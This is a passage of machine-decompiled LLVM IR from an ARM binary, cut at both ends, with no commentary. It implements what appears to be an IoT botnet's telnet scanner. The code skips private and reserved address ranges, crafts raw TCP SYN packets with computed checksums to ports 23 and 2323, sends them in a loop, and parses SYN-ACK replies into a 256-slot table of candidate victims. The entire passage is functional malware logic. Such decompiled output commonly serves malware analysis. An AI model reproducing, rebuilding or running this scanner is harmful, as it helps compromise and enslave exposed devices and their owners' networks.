  %v2_faa0 = xor i1 %v2_fa9c, true
  %v3_faa0 = or i1 %v7_fa9c, %v2_faa0
  br i1 %v3_faa0, label %.thread13, label %bb358

.thread13:                                        ; preds = %dec_label_pc_fa90
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fab4

bb358:                                            ; preds = %dec_label_pc_fa90
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_faa4 = icmp eq i1 %v7_fa90, false
  store i1 %v2_faa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faa4, label %dec_label_pc_fab4, label %dec_label_pc_faac

dec_label_pc_faac:                                ; preds = %bb358
  %v2_faac = icmp ugt i32 %v1_fa30, 125
  store i1 %v2_faac, i1* %cpsr_c.global-to-local, align 1
  %v7_faac = icmp eq i32 %v1_fa30, 126
  store i1 %v7_faac, i1* %cpsr_z.global-to-local, align 1
  %v2_fab0 = xor i1 %v2_faac, true
  %v3_fab0 = or i1 %v7_faac, %v2_fab0
  br i1 %v3_fab0, label %dec_label_pc_fa18, label %dec_label_pc_fab4

dec_label_pc_fab4:                                ; preds = %.thread13, %dec_label_pc_faac, %bb358
  %v2_fab4 = icmp ugt i32 %v1_fa1c, 168
  store i1 %v2_fab4, i1* %cpsr_c.global-to-local, align 1
  %v7_fab4 = icmp eq i32 %v1_fa1c, 169
  store i1 %v7_fab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fab4, label %bb359, label %dec_label_pc_fac0

bb359:                                            ; preds = %dec_label_pc_fab4
  %v3_fab8 = icmp eq i32 %v1_fa30, 255
  store i1 %v3_fab8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_fab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fab8, label %dec_label_pc_fa18, label %dec_label_pc_fac0

dec_label_pc_fac0:                                ; preds = %dec_label_pc_fab4, %bb359
  %v7_fac0 = icmp eq i32 %v1_fa1c, 198
  %.431 = zext i1 %v7_fac0 to i32
  store i32 %.431, i32* %r3.global-to-local, align 4
  %v2_facc = icmp ugt i32 %v1_fa30, 16
  store i1 %v2_facc, i1* %cpsr_c.global-to-local, align 1
  %v7_facc = icmp eq i32 %v1_fa30, 17
  store i1 %v7_facc, i1* %cpsr_z.global-to-local, align 1
  %v2_fad0 = xor i1 %v2_facc, true
  %v3_fad0 = or i1 %v7_facc, %v2_fad0
  br i1 %v3_fad0, label %.thread19, label %bb362

.thread19:                                        ; preds = %dec_label_pc_fac0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fae4

bb362:                                            ; preds = %dec_label_pc_fac0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fad4 = icmp eq i1 %v7_fac0, false
  store i1 %v2_fad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fad4, label %dec_label_pc_fae4, label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %bb362
  %v2_fadc = icmp ugt i32 %v1_fa30, 18
  store i1 %v2_fadc, i1* %cpsr_c.global-to-local, align 1
  %v7_fadc = icmp eq i32 %v1_fa30, 19
  store i1 %v7_fadc, i1* %cpsr_z.global-to-local, align 1
  %v2_fae0 = xor i1 %v2_fadc, true
  %v3_fae0 = or i1 %v7_fadc, %v2_fae0
  br i1 %v3_fae0, label %dec_label_pc_fa18, label %dec_label_pc_fae4

dec_label_pc_fae4:                                ; preds = %.thread19, %dec_label_pc_fadc, %bb362
  %v2_fae4 = icmp ugt i32 %v1_fa1c, 222
  store i1 %v2_fae4, i1* %cpsr_c.global-to-local, align 1
  %v7_fae4 = icmp eq i32 %v1_fa1c, 223
  store i1 %v7_fae4, i1* %cpsr_z.global-to-local, align 1
  %v2_fae8 = xor i1 %v7_fae4, true
  %v3_fae8 = and i1 %v2_fae4, %v2_fae8
  br i1 %v3_fae8, label %dec_label_pc_fa18, label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %dec_label_pc_fae4
  %v1_faec = add nsw i32 %v1_fa1c, -6
  store i32 %v1_faec, i32* %r3.global-to-local, align 4
  %v2_faf0 = icmp ugt i32 %v1_fa1c, 10
  store i1 %v2_faf0, i1* %cpsr_c.global-to-local, align 1
  %v7_faf0 = icmp eq i32 %v1_fa1c, 11
  store i1 %v7_faf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf0, label %dec_label_pc_fa18, label %bb363

bb363:                                            ; preds = %dec_label_pc_faec
  %v3_faf4 = icmp ne i32 %v1_faec, 0
  store i1 %v3_faf4, i1* %cpsr_c.global-to-local, align 1
  %v8_faf4 = icmp eq i32 %v1_faec, 1
  store i1 %v8_faf4, i1* %cpsr_z.global-to-local, align 1
  %v2_faf8 = xor i1 %v3_faf4, true
  %v3_faf8 = or i1 %v8_faf4, %v2_faf8
  br i1 %v3_faf8, label %dec_label_pc_fa18, label %dec_label_pc_fafc

dec_label_pc_fafc:                                ; preds = %bb363
  %v2_fafc = icmp ugt i32 %v1_fa1c, 21
  store i1 %v2_fafc, i1* %cpsr_c.global-to-local, align 1
  %v7_fafc = icmp eq i32 %v1_fa1c, 22
  store i1 %v7_fafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fafc, label %dec_label_pc_fa18, label %bb364

bb364:                                            ; preds = %dec_label_pc_fafc
  %v3_fb00 = icmp ugt i32 %v1_fa1c, 20
  store i1 %v3_fb00, i1* %cpsr_c.global-to-local, align 1
  %v8_fb00 = icmp eq i32 %v1_fa1c, 21
  store i1 %v8_fb00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb00, label %dec_label_pc_fa18, label %dec_label_pc_fb08

dec_label_pc_fb08:                                ; preds = %bb364
  %v2_fb08 = icmp ugt i32 %v1_fa1c, 27
  store i1 %v2_fb08, i1* %cpsr_c.global-to-local, align 1
  %v7_fb08 = icmp eq i32 %v1_fa1c, 28
  store i1 %v7_fb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb08, label %dec_label_pc_fa18, label %bb365

bb365:                                            ; preds = %dec_label_pc_fb08
  %v3_fb0c = icmp ugt i32 %v1_fa1c, 25
  store i1 %v3_fb0c, i1* %cpsr_c.global-to-local, align 1
  %v8_fb0c = icmp eq i32 %v1_fa1c, 26
  store i1 %v8_fb0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb0c, label %dec_label_pc_fa18, label %dec_label_pc_fb14

dec_label_pc_fb14:                                ; preds = %bb365
  %v2_fb14 = icmp ugt i32 %v1_fa1c, 29
  store i1 %v2_fb14, i1* %cpsr_c.global-to-local, align 1
  %v7_fb14 = icmp eq i32 %v1_fa1c, 30
  store i1 %v7_fb14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb14, label %dec_label_pc_fa18, label %bb366

bb366:                                            ; preds = %dec_label_pc_fb14
  %v3_fb18 = icmp ugt i32 %v1_fa1c, 28
  store i1 %v3_fb18, i1* %cpsr_c.global-to-local, align 1
  %v8_fb18 = icmp eq i32 %v1_fa1c, 29
  store i1 %v8_fb18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb18, label %dec_label_pc_fa18, label %dec_label_pc_fb20

dec_label_pc_fb20:                                ; preds = %bb366
  %v2_fb20 = icmp ugt i32 %v1_fa1c, 54
  store i1 %v2_fb20, i1* %cpsr_c.global-to-local, align 1
  %v7_fb20 = icmp eq i32 %v1_fa1c, 55
  store i1 %v7_fb20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb20, label %dec_label_pc_fa18, label %bb367

bb367:                                            ; preds = %dec_label_pc_fb20
  %v3_fb24 = icmp ugt i32 %v1_fa1c, 32
  store i1 %v3_fb24, i1* %cpsr_c.global-to-local, align 1
  %v8_fb24 = icmp eq i32 %v1_fa1c, 33
  store i1 %v8_fb24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb24, label %dec_label_pc_fa18, label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %bb367
  %v2_fb2c = icmp ugt i32 %v1_fa1c, 214
  store i1 %v2_fb2c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb2c = icmp eq i32 %v1_fa1c, 215
  store i1 %v7_fb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb2c, label %.thread30, label %bb368

bb368:                                            ; preds = %dec_label_pc_fb2c
  %v3_fb30 = icmp ugt i32 %v1_fa1c, 213
  store i1 %v3_fb30, i1* %cpsr_c.global-to-local, align 1
  %v8_fb30 = icmp eq i32 %v1_fa1c, 214
  store i1 %v8_fb30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb30, label %bb369, label %dec_label_pc_fb40

.thread30:                                        ; preds = %dec_label_pc_fb2c
  br label %dec_label_pc_fa18

bb369:                                            ; preds = %bb368
  br label %dec_label_pc_fa18

dec_label_pc_fb40:                                ; preds = %bb368
  %v5_fb4c = call i32 @llvm.bswap.i32(i32 %v0_fa18)
  store i32 %v5_fb4c, i32* %r3.global-to-local, align 4
  %tmp370 = and i32 %v0_fa18, 65280
  %tmp371 = call i32 @llvm.bswap.i32(i32 %tmp370)
  %v3_fb54 = udiv i32 %v5_fb4c, 16777216
  %tmp372 = and i32 %v0_fa18, 16711680
  %tmp373 = call i32 @llvm.bswap.i32(i32 %tmp372)
  %v4_fb5c = udiv i32 %tmp371, 256
  %v4_fb60 = mul nuw nsw i32 %tmp373, 256
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* @r0, align 4
  %tmp374 = and i32 %v0_fa18, 65536
  %v3_fb68 = icmp ne i32 %tmp374, 0
  store i1 %v3_fb68, i1* %cpsr_c.global-to-local, align 1
  %v4_fb68 = mul i32 %v5_fb4c, 16777216
  %v5_fb5c = or i32 %v4_fb68, %v3_fb54
  %v5_fb60 = or i32 %v5_fb5c, %v4_fb5c
  %v5_fb68 = or i32 %v5_fb60, %v4_fb60
  store i32 %v5_fb68, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_2361e.254 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_fb68, i32* @global_var_23624.255, align 4
  %v3_fb78 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_23614.178 to i32), i32 20)
  store i32 %v3_fb78, i32* %r0.global-to-local, align 4
  %v3_fb7c = load i16, i16* %stack_var_-52, align 2
  %v4_fb7c = sext i16 %v3_fb7c to i32
  store i32 %v4_fb7c, i32* %r1.global-to-local, align 4
  %tmp531 = sdiv i16 %v3_fb7c, 10
  %v5_fb8c = zext i16 %tmp531 to i32
  %v3_fb90 = mul nuw nsw i32 %v5_fb8c, 8
  store i32 %v3_fb90, i32* %r2.global-to-local, align 4
  %v2_fb98 = mul nuw nsw i32 %v5_fb8c, 10
  store i32 %v2_fb98, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* %ip.global-to-local, align 4
  %v3_fba0 = icmp uge i32 %v4_fb7c, %v2_fb98
  store i1 %v3_fba0, i1* %cpsr_c.global-to-local, align 1
  %v9_fba0 = icmp eq i32 %v4_fb7c, %v2_fb98
  store i1 %v9_fba0, i1* %cpsr_z.global-to-local, align 1
  %v1_fba4 = trunc i32 %v3_fb78 to i16
  store i16 %v1_fba4, i16* bitcast (i32* @global_var_2361e.254 to i16*), align 4
  br i1 %v9_fba0, label %bb375, label %.thread37.thread

.thread37.thread:                                 ; preds = %dec_label_pc_fb40
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23628.181 to i32), i32 2) to i16*), align 2
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* %r0.global-to-local, align 4
  br label %.thread39

bb375:                                            ; preds = %dec_label_pc_fb40
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* %r0.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23628.181 to i32), i32 2) to i16*), align 2
  br label %.thread39

.thread39:                                        ; preds = %.thread37.thread, %bb375
  %v4_fbc8 = load i32, i32* @global_var_23624.255, align 4
  store i32 %v4_fbc8, i32* @global_var_2362c.257, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_23638.258 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_23628.181 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_fbe8 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_23614.178 to i32), i32 ptrtoint (i32* @global_var_23628.181 to i32), i32 5120, i32 20)
  %v6_fbe8 = trunc i32 %v5_fbe8 to i16
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* %r1.global-to-local, align 4
  %v2_fbf4 = load i32, i32* @global_var_26128.176, align 4
  store i16 %v6_fbe8, i16* bitcast (i32* @global_var_23638.258 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_fc20 = load i16, i16* @global_var_2362a.186, align 2
  %v4_fc20 = zext i16 %v3_fc20 to i32
  store i32 %v4_fc20, i32* @lr, align 4
  store i32 %v2_f9e8, i32* %ip.global-to-local, align 4
  store i32 %v2_fbf4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_fc3c = call i32 @__libc_sendto(i32 %v2_fbf4, i32 ptrtoint (i8** @global_var_23614.178 to i32), i32 40, i32 16384, i32 %v2_f9e8, i32 16)
  store i32 %v7_fc3c, i32* %r0.global-to-local, align 4
  %v3_fc40 = load i16, i16* %stack_var_-52, align 2
  %v4_fc40 = sext i16 %v3_fc40 to i32
  %v1_fc44 = add nsw i32 %v4_fc40, 1
  store i32 %v1_fc44, i32* %r3.global-to-local, align 4
  %v3_fc48 = icmp ugt i32 %v1_fc44, 383
  store i1 %v3_fc48, i1* %cpsr_c.global-to-local, align 1
  %v8_fc48 = icmp eq i32 %v1_fc44, 384
  store i1 %v8_fc48, i1* %cpsr_z.global-to-local, align 1
  %v5_fc4c = trunc i32 %v1_fc44 to i16
  store i16 %v5_fc4c, i16* %stack_var_-52, align 2
  %v5_fc50 = icmp slt i32 %v1_fc44, 384
  br i1 %v5_fc50, label %dec_label_pc_f9ec, label %dec_label_pc_fc54

dec_label_pc_fc54:                                ; preds = %.thread39
  %v0_fc54 = load i32, i32* @r4, align 4
  store i32 %v0_fc54, i32* @fp, align 4
  br label %dec_label_pc_fc58

dec_label_pc_fc58:                                ; preds = %dec_label_pc_f9d0, %dec_label_pc_fc54
  %v0_fc58 = call i32 @__GI___errno_location()
  store i32 %v0_fc58, i32* @sb, align 4
  store i32 %stack_var_-1880.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_fc68 = add i32 %stack_var_-1880.0, 20
  store i32 %v1_fc68, i32* @r4, align 4
  %v1_fcbc = add i32 %stack_var_-1880.0, 16
  %v2_fcbc = inttoptr i32 %v1_fcbc to i32*
  %v1_fcd0 = add i32 %stack_var_-1880.0, 9
  %v2_fcd0 = inttoptr i32 %v1_fcd0 to i8*
  %v4_fcfc = sext i16 %stack_var_-1876.0 to i32
  %v1_fd64 = add i32 %stack_var_-1880.0, 12
  %v2_fd64 = inttoptr i32 %v1_fd64 to i32*
  br label %dec_label_pc_fc6c

dec_label_pc_fc6c:                                ; preds = %dec_label_pc_fd2c, %dec_label_pc_fd24, %dec_label_pc_fd1c, %dec_label_pc_fcf8, %dec_label_pc_fce8, %dec_label_pc_fccc, %dec_label_pc_fcb4, %dec_label_pc_fd14, %dec_label_pc_fd08, %dec_label_pc_fcac, %dec_label_pc_fde4, %dec_label_pc_fc58
  %v1_fc70 = phi i32 [ %v0_fc58, %dec_label_pc_fc58 ], [ %v1_fc70.pre.pre, %dec_label_pc_fde4 ], [ %v0_fca0, %dec_label_pc_fcac ], [ %v0_fca0, %dec_label_pc_fd08 ], [ %v0_fca0, %dec_label_pc_fd14 ], [ %v0_fca0, %dec_label_pc_fcb4 ], [ %v0_fca0, %dec_label_pc_fccc ], [ %v0_fca0, %dec_label_pc_fce8 ], [ %v0_fca0, %dec_label_pc_fcf8 ], [ %v0_fca0, %dec_label_pc_fd1c ], [ %v0_fca0, %dec_label_pc_fd24 ], [ %v0_fca0, %dec_label_pc_fd2c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_fc70 = inttoptr i32 %v1_fc70 to i32*
  store i32 0, i32* %v2_fc70, align 4
  %v2_fc7c = load i32, i32* @global_var_26128.176, align 4
  store i32 %v2_fc7c, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc8c = load i32, i32* %ip.global-to-local, align 4
  %v6_fc94 = call i32 @__libc_recvfrom(i32 %v2_fc7c, i32 %stack_var_-1880.0, i32 1514, i32 16384, i32 %v0_fc8c, i32 %v0_fc8c)
  store i32 %v6_fc94, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc98 = icmp eq i32 %v6_fc94, 0
  store i1 %v2_fc98, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v6_fc94, 1
  br i1 %tmp376, label %dec_label_pc_fe08, label %dec_label_pc_fca0

dec_label_pc_fca0:                                ; preds = %dec_label_pc_fc6c
  %v0_fca0 = load i32, i32* @sb, align 4
  %v1_fca0 = inttoptr i32 %v0_fca0 to i32*
  %v2_fca0 = load i32, i32* %v1_fca0, align 4
  store i32 %v2_fca0, i32* %r3.global-to-local, align 4
  %v2_fca4 = icmp ugt i32 %v2_fca0, 10
  store i1 %v2_fca4, i1* %cpsr_c.global-to-local, align 1
  %v7_fca4 = icmp eq i32 %v2_fca0, 11
  store i1 %v7_fca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca4, label %dec_label_pc_fe08, label %dec_label_pc_fcac

dec_label_pc_fcac:                                ; preds = %dec_label_pc_fca0
  %v2_fcac = icmp ugt i32 %v6_fc94, 38
  store i1 %v2_fcac, i1* %cpsr_c.global-to-local, align 1
  %v7_fcac = icmp eq i32 %v6_fc94, 39
  store i1 %v7_fcac, i1* %cpsr_z.global-to-local, align 1
  %v2_fcb0 = xor i1 %v2_fcac, true
  %v3_fcb0 = or i1 %v7_fcac, %v2_fcb0
  br i1 %v3_fcb0, label %dec_label_pc_fc6c, label %dec_label_pc_fcb4

dec_label_pc_fcb4:                                ; preds = %dec_label_pc_fcac
  store i32 %stack_var_-1880.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32* %ip.global-to-local, align 4
  %v3_fcbc = load i32, i32* %v2_fcbc, align 4
  store i32 %v3_fcbc, i32* %r2.global-to-local, align 4
  %v2_fcc0 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_fcc0, i32* %r3.global-to-local, align 4
  %v3_fcc4 = icmp uge i32 %v3_fcbc, %v2_fcc0
  store i1 %v3_fcc4, i1* %cpsr_c.global-to-local, align 1
  %v9_fcc4 = icmp eq i32 %v3_fcbc, %v2_fcc0
  store i1 %v9_fcc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fcc4, label %dec_label_pc_fccc, label %dec_label_pc_fc6c

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fcb4
  store i32 %stack_var_-1880.0, i32* @lr, align 4
  %v3_fcd0 = load i8, i8* %v2_fcd0, align 1
  %v4_fcd0 = zext i8 %v3_fcd0 to i32
  store i32 %v4_fcd0, i32* %r3.global-to-local, align 4
  %v2_fcd4 = icmp ugt i8 %v3_fcd0, 5
  store i1 %v2_fcd4, i1* %cpsr_c.global-to-local, align 1
  %v7_fcd4 = icmp eq i8 %v3_fcd0, 6
  store i1 %v7_fcd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcd4, label %dec_label_pc_fcdc, label %dec_label_pc_fc6c

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fccc
  %v0_fcdc = load i32, i32* @r4, align 4
  %v1_fcdc = inttoptr i32 %v0_fcdc to i16*
  %v2_fcdc = load i16, i16* %v1_fcdc, align 2
  %v3_fcdc = zext i16 %v2_fcdc to i32
  store i32 %v3_fcdc, i32* %ip.global-to-local, align 4
  %v2_fce0 = icmp ugt i16 %v2_fcdc, 5887
  store i1 %v2_fce0, i1* %cpsr_c.global-to-local, align 1
  %v7_fce0 = icmp eq i16 %v2_fcdc, 5888
  store i1 %v7_fce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fce0, label %dec_label_pc_fcf8, label %dec_label_pc_fce8

dec_label_pc_fce8:                                ; preds = %dec_label_pc_fcdc
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_fcf0 = icmp ugt i16 %v2_fcdc, 4872
  store i1 %v3_fcf0, i1* %cpsr_c.global-to-local, align 1
  %v9_fcf0 = icmp eq i16 %v2_fcdc, 4873
  store i1 %v9_fcf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fcf0, label %dec_label_pc_fcf8, label %dec_label_pc_fc6c

dec_label_pc_fcf8:                                ; preds = %dec_label_pc_fce8, %dec_label_pc_fcdc
  %v1_fcf8 = add i32 %v0_fcdc, 2
  %v2_fcf8 = inttoptr i32 %v1_fcf8 to i16*
  %v3_fcf8 = load i16, i16* %v2_fcf8, align 2
  %v4_fcf8 = zext i16 %v3_fcf8 to i32
  store i32 %v4_fcf8, i32* %r3.global-to-local, align 4
  store i32 %v4_fcfc, i32* %r0.global-to-local, align 4
  %v3_fd00 = icmp uge i32 %v4_fcf8, %v4_fcfc
  store i1 %v3_fd00, i1* %cpsr_c.global-to-local, align 1
  %v9_fd00 = icmp eq i32 %v4_fcf8, %v4_fcfc
  store i1 %v9_fd00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fd00, label %dec_label_pc_fd08, label %dec_label_pc_fc6c

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fcf8
  %v1_fd08 = add i32 %v0_fcdc, 13
  %v2_fd08 = inttoptr i32 %v1_fd08 to i8*
  %v3_fd08 = load i8, i8* %v2_fd08, align 1
  %v4_fd08 = zext i8 %v3_fd08 to i32
  store i32 %v4_fd08, i32* %r3.global-to-local, align 4
  %v1_fd0c = and i32 %v4_fd08, 2
  %v2_fd0c = icmp eq i32 %v1_fd0c, 0
  store i1 %v2_fd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd0c, label %dec_label_pc_fc6c, label %dec_label_pc_fd14

dec_label_pc_fd14:                                ; preds = %dec_label_pc_fd08
  %v1_fd14 = and i32 %v4_fd08, 16
  %v2_fd14 = icmp eq i32 %v1_fd14, 0
  store i1 %v2_fd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd14, label %dec_label_pc_fc6c, label %dec_label_pc_fd1c

dec_label_pc_fd1c:                                ; preds = %dec_label_pc_fd14
  %v1_fd1c = and i32 %v4_fd08, 4
  %v2_fd1c = icmp eq i32 %v1_fd1c, 0
  store i1 %v2_fd1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd1c, label %dec_label_pc_fd24, label %dec_label_pc_fc6c

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd1c
  %tmp532 = urem i8 %v3_fd08, 2
  %v2_fd24 = icmp eq i8 %tmp532, 0
  store i1 %v2_fd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd24, label %dec_label_pc_fd2c, label %dec_label_pc_fc6c

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fd24
  %v1_fd2c = add i32 %v0_fcdc, 8
  %v2_fd2c = inttoptr i32 %v1_fd2c to i32*
  %v3_fd2c = load i32, i32* %v2_fd2c, align 4
  %v5_fd44 = call i32 @llvm.bswap.i32(i32 %v3_fd2c)
  %v1_fd48 = add i32 %v5_fd44, -1
  store i32 %v1_fd48, i32* %r2.global-to-local, align 4
  %v1_fd4c = and i32 %v1_fd48, 16711680
  store i32 %v1_fd4c, i32* %r0.global-to-local, align 4
  %v3_fd50 = udiv i32 %v1_fd48, 16777216
  %v4_fd58 = udiv i32 %v1_fd4c, 256
  %v5_fd58 = or i32 %v4_fd58, %v3_fd50
  %v1_fd54 = mul i32 %v1_fd48, 256
  %v4_fd5c = and i32 %v1_fd54, 16711680
  %v5_fd5c = or i32 %v5_fd58, %v4_fd5c
  store i32 %v5_fd5c, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v3_fd64 = load i32, i32* %v2_fd64, align 4
  store i32 %v3_fd64, i32* @lr, align 4
  %v5_fd68 = call i32 @llvm.bswap.i32(i32 %v1_fd48)
  store i32 %v5_fd68, i32* %r3.global-to-local, align 4
  %v3_fd6c = icmp uge i32 %v5_fd68, %v3_fd64
  store i1 %v3_fd6c, i1* %cpsr_c.global-to-local, align 1
  %v9_fd6c = icmp eq i32 %v5_fd68, %v3_fd64
  store i1 %v9_fd6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fd6c, label %dec_label_pc_fd74, label %dec_label_pc_fc6c

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd2c
  %v0_fd74 = load i32, i32* @r5, align 4
  %v2_fd74 = icmp ugt i32 %v0_fd74, 254
  store i1 %v2_fd74, i1* %cpsr_c.global-to-local, align 1
  %v7_fd74 = icmp eq i32 %v0_fd74, 255
  store i1 %v7_fd74, i1* %cpsr_z.global-to-local, align 1
  %v8_fd78 = icmp sgt i32 %v0_fd74, 255
  br i1 %v8_fd78, label %dec_label_pc_fe08, label %dec_label_pc_fd7c

dec_label_pc_fd7c:                                ; preds = %dec_label_pc_fd74
  %v2_fd84 = load i32, i32* @global_var_26124.174, align 4
  store i32 %v2_fd84, i32* %r1.global-to-local, align 4
  %v3_fd88 = mul i32 %v0_fd74, 256
  store i32 %v3_fd88, i32* %r2.global-to-local, align 4
  %v2_fd8c = mul i32 %v0_fd74, 288
  store i32 %v2_fd8c, i32* %r3.global-to-local, align 4
  %v2_fd90 = add i32 %v2_fd84, %v2_fd8c
  store i32 %v2_fd90, i32* @r0, align 4
  %v1_fd94 = add i32 %v2_fd90, 12
  %v2_fd94 = inttoptr i32 %v1_fd94 to i32*
  %v3_fd94 = load i32, i32* %v2_fd94, align 4
  store i32 %v3_fd94, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd98 = icmp eq i32 %v3_fd94, 0
  store i1 %v2_fd98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd98, label %dec_label_pc_fddc, label %dec_label_pc_fdb8.preheader

dec_label_pc_fdb8.preheader:                      ; preds = %dec_label_pc_fd7c
  %v2_fd9c = add i32 %v0_fd74, 1
  %v2_fda4 = and i32 %v2_fd9c, 134217728
  %v3_fda4 = icmp ne i32 %v2_fda4, 0
  store i1 %v3_fda4, i1* %cpsr_c.global-to-local, align 1
  %v3_fda8 = mul i32 %v2_fd9c, 288
  %v3_fdac = add i32 %v2_fd84, %v3_fda8
  store i32 %v3_fdac, i32* %r3.global-to-local, align 4
  store i32 %v0_fd74, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fdb8.preheader, %dec_label_pc_fdc4
  %v0_fdc4 = phi i32 [ %v3_fdac, %dec_label_pc_fdb8.preheader ], [ %v1_fdd0, %dec_label_pc_fdc4 ]
  %v0_fdb8 = phi i32 [ %v0_fd74, %dec_label_pc_fdb8.preheader ], [ %v1_fdb8, %dec_label_pc_fdc4 ]
  %v1_fdb8 = add i32 %v0_fdb8, 1
  store i32 %v1_fdb8, i32* %r2.global-to-local, align 4
  %v7_fdbc = icmp eq i32 %v1_fdb8, 256
  br i1 %v7_fdbc, label %dec_label_pc_fe08.loopexit, label %dec_label_pc_fdc4

dec_label_pc_fdc4:                                ; preds = %dec_label_pc_fdb8
  store i32 %v0_fdc4, i32* @r0, align 4
  %v1_fdc8 = add i32 %v0_fdc4, 12
  %v2_fdc8 = inttoptr i32 %v1_fdc8 to i32*
  %v3_fdc8 = load i32, i32* %v2_fdc8, align 4
  %v2_fdcc = icmp eq i32 %v3_fdc8, 0
  %v1_fdd0 = add i32 %v0_fdc4, 288
  store i32 %v1_fdd0, i32* %r3.global-to-local, align 4
  br i1 %v2_fdcc, label %dec_label_pc_fdd8, label %dec_label_pc_fdb8

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdc4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fdb8, i32* @r5, align 4
  br label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fd7c, %dec_label_pc_fdd8
  %v1_fde4 = phi i32 [ %v2_fd90, %dec_label_pc_fd7c ], [ %v0_fdc4, %dec_label_pc_fdd8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fddc = icmp eq i32 %v1_fde4, 0
  store i1 %v2_fddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fddc, label %dec_label_pc_fe08, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fddc
  %v2_fde4 = add i32 %v1_fde4, 16
  %v3_fde4 = inttoptr i32 %v2_fde4 to i32*
